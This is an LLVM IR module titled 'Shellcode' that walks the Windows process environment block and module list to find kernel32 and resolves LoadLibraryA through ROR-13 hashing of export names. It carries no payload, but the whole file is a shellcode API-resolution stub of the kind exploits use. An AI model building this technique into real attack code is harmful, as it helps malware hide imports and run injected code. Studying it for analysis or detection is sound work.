; ModuleID = "Shellcode"
target triple = "unknown-unknown-unknown"
target datalayout = ""

define i32 @"compute_hash"(i32 %".1")
{
.3:
  %".4" = alloca i32
  store i32 %".1", i32* %".4"
  %"hash" = alloca i32
  store i32 0, i32* %"hash"
  %"cnt" = alloca i8
  store i8 0, i8* %"cnt"
  %"char" = alloca i8
  %".8" = load i32, i32* %".4"
  %".9" = load i8, i8* %"cnt"
  %".10" = zext i8 %".9" to i32
  %".11" = add i32 %".8", %".10"
  %".12" = inttoptr i32 %".11" to i8*
  %".13" = load i8, i8* %".12"
  store i8 %".13", i8* %"char"
  %".15" = load i8, i8* %"char"
  %".16" = icmp ne i8 %".15", 0
  br i1 %".16", label %"loop_1", label %"loop_after_1"
loop_1:
  %".18" = load i32, i32* %"hash"
  %".19" = zext i32 %".18" to i64
  %".20" = ashr i64 %".19", 13
  %".21" = load i32, i32* %"hash"
  %".22" = zext i32 %".21" to i64
  %".23" = shl i64 %".22", 19
  %".24" = or i64 %".20", %".23"
  %".25" = trunc i64 %".24" to i32
  store i32 %".25", i32* %"hash"
  %".27" = load i32, i32* %"hash"
  %".28" = load i8, i8* %"char"
  %".29" = zext i8 %".28" to i32
  %".30" = add i32 %".27", %".29"
  store i32 %".30", i32* %"hash"
  %".32" = load i8, i8* %"cnt"
  %".33" = zext i8 %".32" to i64
  %".34" = add i64 %".33", 1
  %".35" = trunc i64 %".34" to i8
  store i8 %".35", i8* %"cnt"
  %".37" = load i32, i32* %".4"
  %".38" = load i8, i8* %"cnt"
  %".39" = zext i8 %".38" to i32
  %".40" = add i32 %".37", %".39"
  %".41" = inttoptr i32 %".40" to i8*
  %".42" = load i8, i8* %".41"
  store i8 %".42", i8* %"char"
  %".44" = load i8, i8* %"char"
  %".45" = icmp ne i8 %".44", 0
  br i1 %".45", label %"loop_1", label %"loop_after_1"
loop_after_1:
  %".47" = load i32, i32* %"hash"
  ret i32 %".47"
}

define i32 @"find_function"(i32 %".1", i32 %".2")
{
.4:
  %".5" = alloca i32
  store i32 %".1", i32* %".5"
  %".7" = alloca i32
  store i32 %".2", i32* %".7"
  %"pe_signature" = alloca i32
  %".9" = load i32, i32* %".5"
  %".10" = zext i32 %".9" to i64
  %".11" = add i64 %".10", 60
  %".12" = inttoptr i64 %".11" to i32*
  %".13" = load i32, i32* %".12"
  store i32 %".13", i32* %"pe_signature"
  %".15" = load i32, i32* %"pe_signature"
  %".16" = load i32, i32* %".5"
  %".17" = add i32 %".15", %".16"
  store i32 %".17", i32* %"pe_signature"
  %"export_table_directory" = alloca i32
  %".19" = load i32, i32* %"pe_signature"
  %".20" = zext i32 %".19" to i64
  %".21" = add i64 %".20", 120
  %".22" = inttoptr i64 %".21" to i32*
  %".23" = load i32, i32* %".22"
  store i32 %".23", i32* %"export_table_directory"
  %".25" = load i32, i32* %"export_table_directory"
  %".26" = load i32, i32* %".5"
  %".27" = add i32 %".25", %".26"
  store i32 %".27", i32* %"export_table_directory"
  %"number_of_names" = alloca i32
  %".29" = load i32, i32* %"export_table_directory"
  %".30" = zext i32 %".29" to i64
  %".31" = add i64 %".30", 24
  %".32" = inttoptr i64 %".31" to i32*
  %".33" = load i32, i32* %".32"
  store i32 %".33", i32* %"number_of_names"
  %"address_of_names" = alloca i32
  %".35" = load i32, i32* %"export_table_directory"
  %".36" = zext i32 %".35" to i64
  %".37" = add i64 %".36", 32
  %".38" = inttoptr i64 %".37" to i32*
  %".39" = load i32, i32* %".38"
  store i32 %".39", i32* %"address_of_names"
  %".41" = load i32, i32* %"address_of_names"
  %".42" = load i32, i32* %".5"
  %".43" = add i32 %".41", %".42"
  store i32 %".43", i32* %"address_of_names"
  %".45" = load i32, i32* %"number_of_names"
  %".46" = zext i32 %".45" to i64
  %".47" = sub i64 %".46", 1
  %".48" = trunc i64 %".47" to i32
  store i32 %".48", i32* %"number_of_names"
  %".50" = load i32, i32* %"number_of_names"
  %".51" = icmp ugt i32 %".50", 0
  br i1 %".51", label %"loop_2", label %"loop_after_2"
loop_2:
  %"symbol_name" = alloca i32
  %".53" = load i32, i32* %"address_of_names"
  %".54" = load i32, i32* %"number_of_names"
  %".55" = zext i32 %".54" to i64
  %".56" = mul i64 %".55", 4
  %".57" = zext i32 %".53" to i64
  %".58" = add i64 %".57", %".56"
  %".59" = trunc i64 %".58" to i32
  store i32 %".59", i32* %"symbol_name"
  %".61" = load i32, i32* %".5"
  %".62" = load i32, i32* %"symbol_name"
  %".63" = inttoptr i32 %".62" to i32*
  %".64" = load i32, i32* %".63"
  %".65" = add i32 %".61", %".64"
  store i32 %".65", i32* %"symbol_name"
  %"computed" = alloca i32
  %".67" = load i32, i32* %"symbol_name"
  %".68" = call i32 @"compute_hash"(i32 %".67")
  store i32 %".68", i32* %"computed"
  %".70" = load i32, i32* %"computed"
  %".71" = load i32, i32* %".7"
  %".72" = icmp eq i32 %".70", %".71"
  br i1 %".72", label %"loop_2.if", label %"loop_2.else"
loop_after_2:
  ret i32 0
loop_2.if:
  %"address_of_name_ordinal" = alloca i32
  %".74" = load i32, i32* %"export_table_directory"
  %".75" = zext i32 %".74" to i64
  %".76" = add i64 %".75", 36
  %".77" = inttoptr i64 %".76" to i32*
  %".78" = load i32, i32* %".77"
  store i32 %".78", i32* %"address_of_name_ordinal"
  %".80" = load i32, i32* %"address_of_name_ordinal"
  %".81" = load i32, i32* %".5"
  %".82" = add i32 %".80", %".81"
  store i32 %".82", i32* %"address_of_name_ordinal"
  %"ordinal" = alloca i16
  %".84" = load i32, i32* %"address_of_name_ordinal"
  %".85" = load i32, i32* %"number_of_names"
  %".86" = zext i32 %".85" to i64
  %".87" = mul i64 2, %".86"
  %".88" = zext i32 %".84" to i64
  %".89" = add i64 %".88", %".87"
  %".90" = inttoptr i64 %".89" to i16*
  %".91" = load i16, i16* %".90"
  store i16 %".91", i16* %"ordinal"
  %"address_of_functions" = alloca i32
  %".93" = load i32, i32* %"export_table_directory"
  %".94" = zext i32 %".93" to i64
  %".95" = add i64 %".94", 28
  %".96" = inttoptr i64 %".95" to i32*
  %".97" = load i32, i32* %".96"
  store i32 %".97", i32* %"address_of_functions"
  %".99" = load i32, i32* %"address_of_functions"
  %".100" = load i32, i32* %".5"
  %".101" = add i32 %".99", %".100"
  store i32 %".101", i32* %"address_of_functions"
  %"function_address" = alloca i32
  %".103" = load i32, i32* %"address_of_functions"
  %".104" = load i16, i16* %"ordinal"
  %".105" = zext i16 %".104" to i64
  %".106" = mul i64 4, %".105"
  %".107" = zext i32 %".103" to i64
  %".108" = add i64 %".107", %".106"
  %".109" = inttoptr i64 %".108" to i32*
  %".110" = load i32, i32* %".109"
  store i32 %".110", i32* %"function_address"
  %".112" = load i32, i32* %"function_address"
  %".113" = load i32, i32* %".5"
  %".114" = add i32 %".112", %".113"
  store i32 %".114", i32* %"function_address"
  %".116" = load i32, i32* %"function_address"
  ret i32 %".116"
loop_2.else:
  br label %"loop_2.endif"
loop_2.endif:
  %".119" = load i32, i32* %"number_of_names"
  %".120" = zext i32 %".119" to i64
  %".121" = sub i64 %".120", 1
  %".122" = trunc i64 %".121" to i32
  store i32 %".122", i32* %"number_of_names"
  %".124" = load i32, i32* %"number_of_names"
  %".125" = icmp ugt i32 %".124", 0
  br i1 %".125", label %"loop_2", label %"loop_after_2"
}

define i32 @"main"()
{
.2:
  %"pointer" = alloca i32
  store i32 0, i32* %"pointer"
  %".4" = load i32, i32* %"pointer"
  call void asm sideeffect "", "{eax}"
(i32 %".4")
  call void asm  "mov %fs:48, %eax", ""
()
  %".7" = call i32 asm  "", "={eax}"
()
  store i32 %".7", i32* %"pointer"
  %".9" = load i32, i32* %"pointer"
  %".10" = zext i32 %".9" to i64
  %".11" = add i64 %".10", 12
  %".12" = inttoptr i64 %".11" to i32*
  %".13" = load i32, i32* %".12"
  store i32 %".13", i32* %"pointer"
  %".15" = load i32, i32* %"pointer"
  %".16" = zext i32 %".15" to i64
  %".17" = add i64 %".16", 28
  %".18" = inttoptr i64 %".17" to i32*
  %".19" = load i32, i32* %".18"
  store i32 %".19", i32* %"pointer"
  %"base_address" = alloca i32
  %".21" = load i32, i32* %"pointer"
  %".22" = zext i32 %".21" to i64
  %".23" = add i64 %".22", 8
  %".24" = inttoptr i64 %".23" to i32*
  %".25" = load i32, i32* %".24"
  store i32 %".25", i32* %"base_address"
  %"module_name" = alloca i32
  %".27" = load i32, i32* %"pointer"
  %".28" = zext i32 %".27" to i64
  %".29" = add i64 %".28", 32
  %".30" = inttoptr i64 %".29" to i32*
  %".31" = load i32, i32* %".30"
  store i32 %".31", i32* %"module_name"
  %"guard" = alloca i8
  store i8 0, i8* %"guard"
  %".34" = load i8, i8* %"guard"
  %".35" = icmp eq i8 %".34", 0
  br i1 %".35", label %"loop_3", label %"loop_after_3"
loop_3:
  %".37" = load i32, i32* %"pointer"
  %".38" = inttoptr i32 %".37" to i32*
  %".39" = load i32, i32* %".38"
  store i32 %".39", i32* %"pointer"
  %".41" = load i32, i32* %"pointer"
  %".42" = zext i32 %".41" to i64
  %".43" = add i64 %".42", 8
  %".44" = inttoptr i64 %".43" to i32*
  %".45" = load i32, i32* %".44"
  store i32 %".45", i32* %"base_address"
  %".47" = load i32, i32* %"pointer"
  %".48" = zext i32 %".47" to i64
  %".49" = add i64 %".48", 32
  %".50" = inttoptr i64 %".49" to i32*
  %".51" = load i32, i32* %".50"
  store i32 %".51", i32* %"module_name"
  %"char" = alloca i8
  %".53" = load i32, i32* %"module_name"
  %".54" = zext i32 %".53" to i64
  %".55" = add i64 %".54", 24
  %".56" = inttoptr i64 %".55" to i8*
  %".57" = load i8, i8* %".56"
  store i8 %".57", i8* %"char"
  %".59" = load i8, i8* %"char"
  %".60" = icmp eq i8 %".59", 0
  br i1 %".60", label %"loop_3.if", label %"loop_3.else"
loop_after_3:
  %"zero" = alloca i32
  store i32 3960360590, i32* %"zero"
  %"a" = alloca i32
  %".69" = load i32, i32* %"base_address"
  %".70" = load i32, i32* %"zero"
  %".71" = call i32 @"find_function"(i32 %".69", i32 %".70")
  store i32 %".71", i32* %"a"
  %".73" = load i32, i32* %"a"
  ret i32 %".73"
loop_3.if:
  store i8 1, i8* %"guard"
  br label %"loop_3.endif"
loop_3.else:
  br label %"loop_3.endif"
loop_3.endif:
  %".65" = load i8, i8* %"guard"
  %".66" = icmp eq i8 %".65", 0
  br i1 %".66", label %"loop_3", label %"loop_after_3"
}
